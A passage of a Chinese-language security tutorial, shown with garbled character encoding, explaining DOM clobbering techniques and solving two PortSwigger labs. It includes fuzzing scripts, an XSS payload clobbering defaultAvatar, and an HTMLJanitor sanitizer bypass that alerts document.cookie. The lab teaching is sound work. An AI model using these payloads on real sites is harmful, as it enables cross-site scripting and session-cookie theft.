HTMLCollection { readonly attribute unsigned long length; getter Element? item(unsigned long index); getter Element? namedItem(DOMString name); };\n æ–‡ä¸­ä¹Ÿæåˆ°äº†\n â€‹\tHTMLCollection is a historical artifact we cannot rid the web of. While developers are of course welcome to keep using it, new API standard designers ought not to use it (use sequence in IDL instead).\n å®ƒæ˜¯ä¸€ç§å†å²äº§ç‰©ï¼Œå¹¶ä¸”åœ¨ä»Šå¤©æˆ‘ä»¬ä¹Ÿå¯ä»¥ç»§ç»­ä½¿ç”¨è¿™ä¸ªç±»ï¼Œåªæ˜¯å¯¹äº API æ ‡å‡†è®¾è®¡è€…ä¸æ¨èå†ä½¿ç”¨ã€‚\nå…³äºå®ƒçš„ç”¨æ³•ï¼š\n collection . length\nâ€‹\tReturns the number of elements in the collection.\nelement = collection . item(index)\nelement = collection[index]\nâ€‹\tReturns the element with index index from the collection. The elements are sorted in tree order.\nelement = collection . namedItem(name)\nelement = collection[name]\nâ€‹\tReturns the first element with ID or name name from the collection.\n è®©æˆ‘ä»¬å€¼å¾—æ³¨æ„çš„æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡collection[name]çš„å½¢å¼æ¥è°ƒç”¨å…¶ä¸­çš„å…ƒç´ ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼¼ä¹å¯ä»¥é€šè¿‡å…ˆæ„å»ºä¸€ä¸ªHTMLCollectionï¼Œå†é€šè¿‡collection[name]çš„å½¢å¼æ¥è°ƒç”¨ã€‚\n\u0026lt;div id=\u0026#34;x\u0026#34;\u0026gt; \u0026lt;a id=\u0026#34;x\u0026#34; name=y href=\u0026#34;1:hasaki\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt;  \nHTML Relationships å†è€…ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡åˆ©ç”¨ HTML æ ‡ç­¾ä¹‹é—´å­˜åœ¨çš„å…³ç³»æ¥æ„å»ºå±‚çº§å…³ç³»ã€‚\nvar log=[]; var html = [\u0026#34;a\u0026#34;,\u0026#34;abbr\u0026#34;,\u0026#34;acronym\u0026#34;,\u0026#34;address\u0026#34;,\u0026#34;applet\u0026#34;,\u0026#34;area\u0026#34;,\u0026#34;article\u0026#34;,\u0026#34;aside\u0026#34;,\u0026#34;audio\u0026#34;,\u0026#34;b\u0026#34;,\u0026#34;base\u0026#34;,\u0026#34;basefont\u0026#34;,\u0026#34;bdi\u0026#34;,\u0026#34;bdo\u0026#34;,\u0026#34;bgsound\u0026#34;,\u0026#34;big\u0026#34;,\u0026#34;blink\u0026#34;,\u0026#34;blockquote\u0026#34;,\u0026#34;body\u0026#34;,\u0026#34;br\u0026#34;,\u0026#34;button\u0026#34;,\u0026#34;canvas\u0026#34;,\u0026#34;caption\u0026#34;,\u0026#34;center\u0026#34;,\u0026#34;cite\u0026#34;,\u0026#34;code\u0026#34;,\u0026#34;col\u0026#34;,\u0026#34;colgroup\u0026#34;,\u0026#34;command\u0026#34;,\u0026#34;content\u0026#34;,\u0026#34;data\u0026#34;,\u0026#34;datalist\u0026#34;,\u0026#34;dd\u0026#34;,\u0026#34;del\u0026#34;,\u0026#34;details\u0026#34;,\u0026#34;dfn\u0026#34;,\u0026#34;dialog\u0026#34;,\u0026#34;dir\u0026#34;,\u0026#34;div\u0026#34;,\u0026#34;dl\u0026#34;,\u0026#34;dt\u0026#34;,\u0026#34;element\u0026#34;,\u0026#34;em\u0026#34;,\u0026#34;embed\u0026#34;,\u0026#34;fieldset\u0026#34;,\u0026#34;figcaption\u0026#34;,\u0026#34;figure\u0026#34;,\u0026#34;font\u0026#34;,\u0026#34;footer\u0026#34;,\u0026#34;form\u0026#34;,\u0026#34;frame\u0026#34;,\u0026#34;frameset\u0026#34;,\u0026#34;h1\u0026#34;,\u0026#34;head\u0026#34;,\u0026#34;header\u0026#34;,\u0026#34;hgroup\u0026#34;,\u0026#34;hr\u0026#34;,\u0026#34;html\u0026#34;,\u0026#34;i\u0026#34;,\u0026#34;iframe\u0026#34;,\u0026#34;image\u0026#34;,\u0026#34;img\u0026#34;,\u0026#34;input\u0026#34;,\u0026#34;ins\u0026#34;,\u0026#34;isindex\u0026#34;,\u0026#34;kbd\u0026#34;,\u0026#34;keygen\u0026#34;,\u0026#34;label\u0026#34;,\u0026#34;legend\u0026#34;,\u0026#34;li\u0026#34;,\u0026#34;link\u0026#34;,\u0026#34;listing\u0026#34;,\u0026#34;main\u0026#34;,\u0026#34;map\u0026#34;,\u0026#34;mark\u0026#34;,\u0026#34;marquee\u0026#34;,\u0026#34;menu\u0026#34;,\u0026#34;menuitem\u0026#34;,\u0026#34;meta\u0026#34;,\u0026#34;meter\u0026#34;,\u0026#34;multicol\u0026#34;,\u0026#34;nav\u0026#34;,\u0026#34;nextid\u0026#34;,\u0026#34;nobr\u0026#34;,\u0026#34;noembed\u0026#34;,\u0026#34;noframes\u0026#34;,\u0026#34;noscript\u0026#34;,\u0026#34;object\u0026#34;,\u0026#34;ol\u0026#34;,\u0026#34;optgroup\u0026#34;,\u0026#34;option\u0026#34;,\u0026#34;output\u0026#34;,\u0026#34;p\u0026#34;,\u0026#34;param\u0026#34;,\u0026#34;picture\u0026#34;,\u0026#34;plaintext\u0026#34;,\u0026#34;pre\u0026#34;,\u0026#34;progress\u0026#34;,\u0026#34;q\u0026#34;,\u0026#34;rb\u0026#34;,\u0026#34;rp\u0026#34;,\u0026#34;rt\u0026#34;,\u0026#34;rtc\u0026#34;,\u0026#34;ruby\u0026#34;,\u0026#34;s\u0026#34;,\u0026#34;samp\u0026#34;,\u0026#34;script\u0026#34;,\u0026#34;section\u0026#34;,\u0026#34;select\u0026#34;,\u0026#34;shadow\u0026#34;,\u0026#34;slot\u0026#34;,\u0026#34;small\u0026#34;,\u0026#34;source\u0026#34;,\u0026#34;spacer\u0026#34;,\u0026#34;span\u0026#34;,\u0026#34;strike\u0026#34;,\u0026#34;strong\u0026#34;,\u0026#34;style\u0026#34;,\u0026#34;sub\u0026#34;,\u0026#34;summary\u0026#34;,\u0026#34;sup\u0026#34;,\u0026#34;svg\u0026#34;,\u0026#34;table\u0026#34;,\u0026#34;tbody\u0026#34;,\u0026#34;td\u0026#34;,\u0026#34;template\u0026#34;,\u0026#34;textarea\u0026#34;,\u0026#34;tfoot\u0026#34;,\u0026#34;th\u0026#34;,\u0026#34;thead\u0026#34;,\u0026#34;time\u0026#34;,\u0026#34;title\u0026#34;,\u0026#34;tr\u0026#34;,\u0026#34;track\u0026#34;,\u0026#34;tt\u0026#34;,\u0026#34;u\u0026#34;,\u0026#34;ul\u0026#34;,\u0026#34;var\u0026#34;,\u0026#34;video\u0026#34;,\u0026#34;wbr\u0026#34;,\u0026#34;xmp\u0026#34;], logs = []; div=document.createElement(\u0026#39;div\u0026#39;); for(var i=0;i\u0026lt;html.length;i++) { for(var j=0;j\u0026lt;html.length;j++) { div.innerHTML=\u0026#39;\u0026lt;\u0026#39;+html[i]+\u0026#39; id=element1\u0026gt;\u0026#39;+\u0026#39;\u0026lt;\u0026#39;+html[j]+\u0026#39; id=element2\u0026gt;\u0026#39;; document.body.appendChild(div); if(window.element1 \u0026amp;\u0026amp; element1.element2){ log.push(html[i]+\u0026#39;,\u0026#39;+html[j]); } document.body.removeChild(div); } } console.log(log.join(\u0026#39;\\n\u0026#39;)); ä»¥ä¸Šä»£ç æµ‹è¯•äº†ç°åœ¨ HTML5 åŸºæœ¬ä¸Šæ‰€æœ‰çš„æ ‡ç­¾ï¼Œä½¿ç”¨ä¸¤å±‚çš„å±‚çº§å…³ç³»è¿›è¡Œ fuzz ï¼Œæ³¨æ„è¿™é‡Œåªä½¿ç”¨äº†idï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨nameï¼Œé‡ä¸Šæ–‡çš„HTMLCollectionå¹¶ä¸æ˜¯ä¸€ç§æ–¹æ³•ã€‚\næˆ‘ä»¬å¯ä»¥å¾—åˆ°çš„æ˜¯ä»¥ä¸‹å…³ç³»ï¼š\nform-\u0026gt;button form-\u0026gt;fieldset form-\u0026gt;image form-\u0026gt;img form-\u0026gt;input form-\u0026gt;object form-\u0026gt;output form-\u0026gt;select form-\u0026gt;textarea å¦‚æœæˆ‘ä»¬æƒ³è¦æ„å»ºx.yçš„å½¢å¼ï¼Œæˆ‘ä»¬å¯ä»¥è¿™ä¹ˆæ„å»ºï¼š\n\u0026lt;form id=x\u0026gt;\u0026lt;output id=y\u0026gt;I\u0026#39;ve been clobbered\u0026lt;/output\u0026gt; \u0026lt;script\u0026gt; alert(x.y.value); \u0026lt;/script\u0026gt; Three Level ä¸‰çº§çš„å±‚çº§å…³ç³»æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°ä»¥ä¸Šä¸¤ç§æŠ€å·§æ¥æ„å»ºäº†\n\u0026lt;form id=\u0026#34;x\u0026#34; name=\u0026#34;y\u0026#34;\u0026gt;\u0026lt;output id=z\u0026gt;I\u0026#39;ve been clobbered\u0026lt;/output\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;form id=\u0026#34;x\u0026#34;\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; alert(x.y.z.value); \u0026lt;/script\u0026gt; è¿™ä¸ªä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå…ˆç”¨ä¸€ä¸ªHTMLCollectionè·å–ç¬¬äºŒçº§ï¼Œå†åœ¨ç¬¬ä¸€ä¸ªè¡¨å•ä¸­ç”¨outputæ ‡ç­¾å³å¯ã€‚\nMore ä¸‰å±‚å±‚çº§ä»¥ä¸Šçš„æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°iframeä¸srcdocæ¥è¿›è¡Œé…åˆ\n\u0026lt;iframe name=a srcdoc=\u0026#34; \u0026lt;iframe srcdoc=\u0026#39;\u0026lt;a id=c name=d href=cid:Clobbered\u0026gt;test\u0026lt;/a\u0026gt;\u0026lt;a id=c\u0026gt;\u0026#39; name=b\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;script\u0026gt;setTimeout(()=\u0026gt;alert(a.b.c.d),500)\u0026lt;/script\u0026gt; å› ä¸ºéœ€è¦ç­‰å¾…æ‰€æœ‰çš„iframeåŠ è½½å®Œæ¯•æˆ‘ä»¬æ‰èƒ½è·å¾—è¿™ä¸ªå±‚çº§å…³ç³»ï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ°å»¶æ—¶ï¼Œä¸ç”¨å»¶æ—¶ä¹Ÿå¯ä»¥é€šè¿‡ç½‘ç»œè¯·æ±‚æ¥è¿›è¡Œå»¶ç¼“ï¼š\n\u0026lt;iframe name=a srcdoc=\u0026#34; \u0026lt;iframe srcdoc=\u0026#39;\u0026lt;a id=c name=d href=cid:Clobbered\u0026gt;test\u0026lt;/a\u0026gt;\u0026lt;a id=c\u0026gt;\u0026#39; name=b\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;style\u0026gt;@import \u0026#39;http://example.com\u0026#39;;\u0026lt;/style\u0026gt; \u0026lt;script\u0026gt; alert(a.b.c.d) \u0026lt;/script\u0026gt; Custom ä»¥ä¸Šæˆ‘ä»¬éƒ½æ˜¯é€šè¿‡ id æˆ–è€… name æ¥åˆ©ç”¨ï¼Œé‚£æˆ‘ä»¬èƒ½ä¸èƒ½é€šè¿‡è‡ªå®šä¹‰å±æ€§æ¥æ„é€ å‘¢ï¼Ÿ\n\u0026lt;form id=x y=123\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; alert(x.y)//undefined \u0026lt;/script\u0026gt; å¾ˆæ˜æ˜¾ï¼Œè¿™æ„å‘³ç€ä»»ä½•æœªå®šä¹‰çš„å±æ€§éƒ½ä¸ä¼šå…·æœ‰ DOM å±æ€§ï¼Œæ‰€ä»¥å°±è¿”å›äº† undefined\næˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹ fuzz æ‰€æœ‰æ ‡ç­¾çš„æœ‰æ²¡æœ‰å­—ç¬¦ä¸²ç±»å‹çš„å±æ€§å¯ä¾›æˆ‘ä»¬ä½¿ç”¨ï¼š\nvar html = [...]//HTML elements array var props=[]; for(i=0;i\u0026lt;html.length;i++){ obj = document.createElement(html[i]); for(prop in obj) { if(typeof obj[prop] === \u0026#39;string\u0026#39;) { try { props.push(html[i]+\u0026#39;:\u0026#39;+prop); }catch(e){} } } } console.log([...new Set(props)].join(\u0026#39;\\n\u0026#39;)); æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€ç³»åˆ—æ ‡ç­¾å­—ç¬¦ä¸²ç±»å‹çš„å±æ€§ï¼Œä¾‹å¦‚:\na:username a:password ä½†æ˜¯è¿™ä»…ä»…å¾—åˆ°çš„åªæ˜¯çŸ¥é“å®ƒä»¬å±æ€§ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“èƒ½ä¸èƒ½åˆ©ç”¨ï¼Œäºæ˜¯æˆ‘ä»¬éœ€è¦åŠ ä¸Šä¸€äº›ä¸œè¥¿æ¥è¿›è¡ŒéªŒè¯\nvar html = [...]//HTML elements array var props=[]; for(i=0;i\u0026lt;html.length;i++){ obj = document.createElement(html[i]); for(prop in obj) { if(typeof obj[prop] === \u0026#39;string\u0026#39;) { try { DOM.innerHTML = \u0026#39;\u0026lt;\u0026#39;+html[i]+\u0026#39; id=x \u0026#39;+prop+\u0026#39;=1\u0026gt;\u0026#39;; if(document.getElementById(\u0026#39;x\u0026#39;)[prop] == 1) { props.push(html[i]+\u0026#39;:\u0026#39;+prop); } }catch(e){} } } } console.log([...new Set(props)].join(\u0026#39;\\n\u0026#39;)); æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€ç³»åˆ—çš„æ ‡ç­¾ä»¥åŠå…¶å±æ€§åç§°ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶ä¸­çš„a:titleæ¥è¿›è¡Œç»„åˆ\n\u0026lt;a id=x title=\u0026#39;hasaki\u0026#39;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;script\u0026gt; console.log(x.title);//hasaki \u0026lt;/script\u0026gt; å…¶ä¸­åœ¨æˆ‘ä»¬ç¬¬ä¸€æ­¥å¾—åˆ°çš„å±æ€§ä¸­æ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯ a æ ‡ç­¾çš„usernameè·Ÿpasswordå±æ€§ï¼Œè™½ç„¶æˆ‘ä»¬ä¸èƒ½ç›´æ¥é€šè¿‡titleè¿™ç§å½¢å¼åˆ©ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡hrefçš„å½¢å¼æ¥è¿›è¡Œåˆ©ç”¨ï¼š\n\u0026lt;a id=x href=\u0026#34;ftp:Clobbered-username:Clobbered-Password@a\u0026#34;\u0026gt; \u0026lt;script\u0026gt; alert(x.username)//Clobbered-username alert(x.password)//Clobbered-password \u0026lt;/script\u0026gt; Exploit Example PostWigger æä¾›äº†ä¸¤ä¸ªå®éªŒç¯å¢ƒ https://portswigger.net/web-security/dom-based/dom-clobberingï¼Œ\nLab: Exploiting DOM clobbering to enable XSS  â€‹\tThis lab contains a DOM-clobbering vulnerability. The comment functionality allows \u0026ldquo;safe\u0026rdquo; HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call the alert() function.\n è¿™ä¸ªå®éªŒæˆ‘ä»¬å¯ä»¥åœ¨resources/js/loadCommentsWithDomPurify.jsè·¯ç”±æ‰¾åˆ°è¿™ä¸ª JS æ–‡ä»¶ï¼Œåœ¨displayComments()å‡½æ•°ä¸­æˆ‘ä»¬åˆå¯ä»¥å‘ç°\nlet defaultAvatar = window.defaultAvatar || {avatar: \u0026#39;/resources/images/avatarDefault.svg\u0026#39;} let avatarImgHTML = \u0026#39;\u0026lt;img class=\u0026#34;avatar\u0026#34; src=\u0026#34;\u0026#39; + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + \u0026#39;\u0026#34;\u0026gt;\u0026#39;; let divImgContainer = document.createElement(\u0026#34;div\u0026#34;); divImgContainer.innerHTML = avatarImgHTML è¿™é‡Œå¾ˆæ˜æ˜¾æˆ‘ä»¬å¯ä»¥ç”¨ Dom Clobbering æ¥æ§åˆ¶ window.defaultAvatarï¼Œåªè¦æˆ‘ä»¬åŸæ¥æ²¡æœ‰å¤´åƒå°±å¯ä»¥ç”¨ä¸€ä¸ªæ„é€ ä¸€ä¸ªdefaultAvatar.avatarè¿›è¡Œ XSS äº†ã€‚\næ ¹æ®å‰é¢çš„çŸ¥è¯†ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸¤å±‚çš„å±‚çº§å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ HTMLCollection æ¥æ“ä½œ\n\u0026lt;a id=defaultAvatar\u0026gt;\u0026lt;a id=defaultAvatar name=avatar href=\u0026#34;1:\u0026amp;quot;onerror=alert(1)//\u0026#34;\u0026gt; è¿™é‡Œæ³¨æ„\u0026quot;éœ€è¦è¿›è¡Œ HTMLå®ä½“ç¼–ç ï¼Œç”¨ URL ç¼–ç çš„è¯æµè§ˆå™¨ä¼šæŠ¥é”™1:%22onerror=alert(1)// net::ERR_FILE_NOT_FOUNDã€‚\nè¿™æ ·è¯„è®ºä»¥åæˆ‘ä»¬å¯ä»¥åœ¨è‡ªå·±çš„è¯„è®ºå¤„çœ‹åˆ°ï¼š\n\u0026lt;p\u0026gt;\u0026lt;a id=\u0026#34;defaultAvatar\u0026#34;\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;a href=\u0026#34;1:\u0026amp;quot;onerror=alert(1)//\u0026#34; name=\u0026#34;avatar\u0026#34; id=\u0026#34;defaultAvatar\u0026#34;\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; æˆ‘ä»¬å†éšä¾¿è¯„è®ºä¸€ä¸‹å°±å¥½äº†ï¼Œå°±å¯ä»¥è§¦å‘æˆ‘ä»¬æ„é€ çš„ XSS äº†ã€‚\n \nLab:Clobbering DOM attributes to bypass HTML filters  â€‹\tThis lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that alerts document.cookie. You may need to use the exploit server in order to make your vector auto-execute in the victim\u0026rsquo;s browser.\nNote: The intended solution to this lab will not work in Firefox. We recommend using Chrome to complete this lab.\n è¿™ä¸ªé¢˜ç›®ä¹Ÿæ¯”è¾ƒæœ‰æ„æ€ï¼Œåœ¨resources/js/loadCommentsWithHtmlJanitor.jsæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä»£ç å®‰å…¨å¤šäº†ï¼Œæ²¡æœ‰æ˜æ˜¾çš„ç›´æ¥ç”¨Window.xè¿™ç§ä»£ç äº†\nlet janitor = new HTMLJanitor({tags: {input:{name:true,type:true,value:true},form:{id:true},i:{},b:{},p:{}}}); ä¸€å¼€å§‹å°±åˆå§‹åŒ–äº†HTMLJanitorï¼Œåªèƒ½ä½¿ç”¨åˆå§‹åŒ–å†…çš„æ ‡ç­¾åŠå…¶å±æ€§ï¼Œå¯¹äºé‡è¦çš„è¾“å…¥è¾“å‡ºåœ°æ–¹éƒ½ä½¿ç”¨äº†janitor.cleanè¿›è¡Œè¿‡æ»¤ã€‚çœ‹èµ·æ¥æˆ‘ä»¬æ²¡åŠæ³•å¾ˆç®€å•åœ°è¿›è¡Œ XSS ï¼Œé‚£æˆ‘ä»¬å°±åªèƒ½æ¥çœ‹çœ‹resources/js/htmlJanitor.jsè¿™ä¸ªè¿‡æ»¤æ–‡ä»¶äº†ã€‚\nHTMLJanitor.prototype.clean = function(html) { const sandbox = document.implementation.createHTMLDocument(\u0026#34;\u0026#34;); const root = sandbox.createElement(\u0026#34;div\u0026#34;); root.innerHTML = html; this._sanitize(sandbox, root); return root.innerHTML; }; é¦–å…ˆç”¨document.implementation.createHTMLDocumentåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ HTML æ–‡æ¡£ç”¨ä½œ sandbox ï¼Œç„¶åå¯¹äº sandbox å†…çš„å…ƒç´ è¿›è¡Œ_sanitizeè¿‡æ»¤ã€‚\nHTMLJanitor.prototype._sanitize = function(document, parentNode) { var treeWalker = createTreeWalker(document, parentNode); //... } åœ¨_sanitizeå‡½æ•°ä¸€å¼€å§‹è°ƒç”¨äº†createTreeWalkerå‡½æ•°åˆ›å»ºä¸€ä¸ªTreeWalkerï¼Œè¿™ä¸ªç±»è¡¨ç¤ºä¸€ä¸ªå½“å‰æ–‡æ¡£çš„å­æ ‘ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹åŠå…¶ä½ç½®ã€‚\nfunction createTreeWalker(document, node) { return document.createTreeWalker( node, NodeFilter.SHOW_TEXT | NodeFilter.SHOW_ELEMENT | NodeFilter.SHOW_COMMENT, null, false ); } è¿™é‡Œçš„nodeå³ä¸ºä¸€å¼€å§‹çš„rootï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ„é€ çš„htmlä¼šåœ¨ä¼ å…¥åˆ°nodeå‚æ•°ï¼Œdocumentå³ä¸ºä¸€å¼€å§‹çš„sandboxï¼Œæ¥ç€è¿›å…¥å¾ªç¯è¿›è¡Œåˆ¤æ–­ï¼Œå¯¹äºæ–‡æœ¬å‘¢ç»’ä»¥åŠæ³¨é‡Šè¿›è¡Œå¤„ç†\nif (node.nodeType === Node.TEXT_NODE) { //å¦‚æœæ­¤æ–‡æœ¬èŠ‚ç‚¹åªæ˜¯ç©ºç™½ï¼Œå¹¶ä¸”ä¸Šä¸€ä¸ªæˆ–ä¸‹ä¸€ä¸ªå…ƒç´ åŒçº§æ˜¯`blockElement`ï¼Œåˆ™å°†å…¶åˆ é™¤ } // ç§»é™¤æ‰€æœ‰çš„æ³¨é‡Š if (node.nodeType === Node.COMMENT_NODE) { //... } //æ£€æŸ¥`inlineElement`ä¸­æ˜¯å¦è¿˜æœ‰`BlockElement` var isInline = isInlineElement(node); var containsBlockElement; if (isInline) { containsBlockElement = Array.prototype.some.call( node.childNodes, isBlockElement ); } //æ£€æŸ¥`BlockElement`æ˜¯å¦åµŒå¥— var isNotTopContainer = !!parentNode.parentNode; var isNestedBlockElement = isBlockElement(parentNode) \u0026amp;\u0026amp; isBlockElement(node) \u0026amp;\u0026amp; isNotTopContainer; var nodeName = node.nodeName.toLowerCase(); //è·å–å…è®¸ä½¿ç”¨çš„å±æ€§ var allowedAttrs = getAllowedAttrs(this.config, nodeName, node); var isInvalid = isInline \u0026amp;\u0026amp; containsBlockElement; //æ ¹æ®ç™½åå•åˆ é™¤æ ‡ç­¾ if ( isInvalid || shouldRejectNode(node, allowedAttrs) || (!this.config.keepNestedBlockElements \u0026amp;\u0026amp; isNestedBlockElement) ) { // Do not keep the inner text of SCRIPT/STYLE elements.  if ( !(node.nodeName === \u0026#34;SCRIPT\u0026#34; || node.nodeName === \u0026#34;STYLE\u0026#34;) ) { while (node.childNodes.length \u0026gt; 0) { parentNode.insertBefore(node.childNodes[0], node); } } parentNode.removeChild(node); this._sanitize(document, parentNode); break; } æœ€åçœ‹åˆ°å€¼å¾—æˆ‘ä»¬å…³æ³¨çš„ç‚¹ï¼š\n// Sanitize attributes for (var a = 0; a \u0026lt; node.attributes.length; a += 1) { var attr = node.attributes[a]; if (shouldRejectAttr(attr, allowedAttrs, node)) { node.removeAttribute(attr.name); // Shift the array to continue looping.  a = a - 1; } } // Sanitize children this._sanitize(document, node); åœ¨è¿™é‡Œæœ€ç»ˆå¯¹æ ‡ç­¾çš„å±æ€§è¿›è¡Œäº† check ï¼Œå¯¹ node çš„æ¯ä¸ªå±æ€§éƒ½è¿›è¡Œäº†ç™½åå•æ£€æŸ¥\nfunction shouldRejectAttr(attr, allowedAttrs, node) { var attrName = attr.name.toLowerCase(); if (allowedAttrs === true) { return false; } else if (typeof allowedAttrs[attrName] === \u0026#34;function\u0026#34;) { return !allowedAttrs[attrName](attr.value, node); } else if (typeof allowedAttrs[attrName] === \u0026#34;undefined\u0026#34;) { return true; } else if (allowedAttrs[attrName] === false) { return true; } else if (typeof allowedAttrs[attrName] === \u0026#34;string\u0026#34;) { return allowedAttrs[attrName] !== attr.value; } return false; } å¦‚æœå‘ç°æœ‰ä¸åœ¨ç™½åå•çš„å±æ€§ï¼Œä¼šä½¿ç”¨node.removeAttribute(attr.name);è¿›è¡Œåˆ é™¤ï¼Œç„¶åå¯¹å­èŠ‚ç‚¹è¿›è¡Œé€’å½’_sanitizeã€‚æ‰€ä»¥æœ‰ä¸¤ä¸ªæ€è·¯ï¼Œè¦ä¹ˆç»•æ ‡ç­¾è¿‡æ»¤ï¼Œè¦ä¹ˆç»•èŠ‚ç‚¹å±æ€§è¿‡æ»¤ã€‚\næ ‡ç­¾çš„è·å–ç”±treeWalker.firstChild();å¾—åˆ°ï¼Œè¿‡æ»¤ç”±getAllowedAttrsä»¥åŠshouldRejectNodeä¸¤ä¸ªå‡½æ•°è¿›è¡Œï¼Œç”±äºè¿™é‡Œçš„è¿‡æ»¤æ˜¯è¿›è¡Œç™½åå•è¿‡æ»¤ï¼Œæ²¡ä»€ä¹ˆåŠæ³•è¿›è¡Œç»•è¿‡ï¼›å±æ€§çš„è·å–åœ¨ä¸€ä¸ªforå¾ªç¯å½“ä¸­ï¼Œæ¡ä»¶æ˜¯node.attributes.lengthï¼Œè·å–æ–¹å¼æ˜¯node.attributes[a]ï¼Œè¿‡æ»¤ç”±shouldRejectAttræ–¹æ³•è¿›è¡Œã€‚\nå¯¹ Dom Clobbering æ¯”è¾ƒæ•æ„Ÿçš„åŒå­¦å¯èƒ½ä¼šæ³¨æ„åˆ°è¿™é‡Œï¼Œå¯¹äº node å±æ€§è¿‡æ»¤æ—¶çš„forå¾ªç¯æ¡ä»¶ï¼Œç›´æ¥ä½¿ç”¨äº†node.attributes.lengthï¼Œå€˜è‹¥æˆ‘ä»¬æ„é€ çš„èŠ‚ç‚¹æ­£å¥½æœ‰ä¸€ä¸ªattributeså­èŠ‚ç‚¹ä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿ\n\u0026lt;form id=x\u0026gt; \u0026lt;img\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; var node = document.getElementById(\u0026#39;x\u0026#39;); console.log(node.attributes); for (let a = 0; a \u0026lt; node.attributes.length; a++) { console.log(node.attributes[a]); } console.log(\u0026#39;finished\u0026#39;); \u0026lt;/script\u0026gt; ä»¥ä¸Šè¿™æ®µä»£ç ä¼šè¾“å‡ºä¸€ä¸ªNamedNodeMapå¯¹è±¡ï¼Œid='x'ä»¥åŠ finished\n\u0026lt;form id=x\u0026gt; \u0026lt;img name=attributes\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; var node = document.getElementById(\u0026#39;x\u0026#39;); console.log(node.attributes); for (let a = 0; a \u0026lt; node.attributes.length; a++) { console.log(node.attributes[a]); } console.log(\u0026#39;finished\u0026#39;); \u0026lt;/script\u0026gt; ä»¥ä¸Šè¿™æ®µä»£ç ä¼šè¾“å‡º\u0026lt;img name=attributes\u0026gt;ä»¥åŠ finished ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä½¿ç”¨name=attributesæˆåŠŸåœ°è¦†ç›–äº†åŸæ¥çš„node.attributesï¼Œæ‰€ä»¥node.attributes.lengthåœ¨è¿™é‡Œçš„å€¼ä¸ºundefinedï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰å½±å“ JS ä»£ç çš„ç»§ç»­è¿è¡Œã€‚\næ‰€ä»¥æ˜ç™½äº†è¿™ä¸ªç®€å•çš„ä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªåŒ…å«æœ‰name=attributesçš„å­èŠ‚ç‚¹çš„ payload ç»•è¿‡å±æ€§çš„ check ï¼Œè¿™é‡Œç»™å®šçš„ç™½åå•æ ‡ç­¾ä¹Ÿæ¯”è¾ƒæ˜æ˜¾ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ HTML Relationships æ¥æ„é€ æˆ‘ä»¬çš„ payload\n\u0026lt;form id=x \u0026gt;\u0026lt;input id=attributes\u0026gt; æ¥ç€å°±æ˜¯æ„é€  XSS äº†ï¼Œæ ¹æ®é¢˜ç›®è¦æ±‚ï¼Œéœ€è¦ç”¨æˆ·è®¿é—®è§¦å‘ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨tabindexå±æ€§ï¼Œé…åˆformçš„onfocusæ—¶é—´æ¥ XSS ã€‚\n\u0026lt;form id=x tabindex=0 onfocus=alert(document.cookie)\u0026gt;\u0026lt;input id=attributes\u0026gt; æŠŠå®ƒå½“ä½œè¯„è®ºæäº¤\n \nä½†æ˜¯å¦‚æœç›´æ¥äº¤ç»™ç”¨æˆ·ç‚¹å‡»çš„è¯æ˜¯ä¸ä¼šè§¦å‘çš„ï¼Œå› ä¸ºè¯„è®ºæ˜¯ç”± aJax è¯·æ±‚æ‹¿åˆ°çš„ï¼Œç›´æ¥è®¿é—®çš„è¯ï¼ŒDom æ ‘æ˜¯è¿˜æ²¡æœ‰è¯„è®ºçš„ï¼Œå¾—éœ€è¦ç­‰å¾… JS 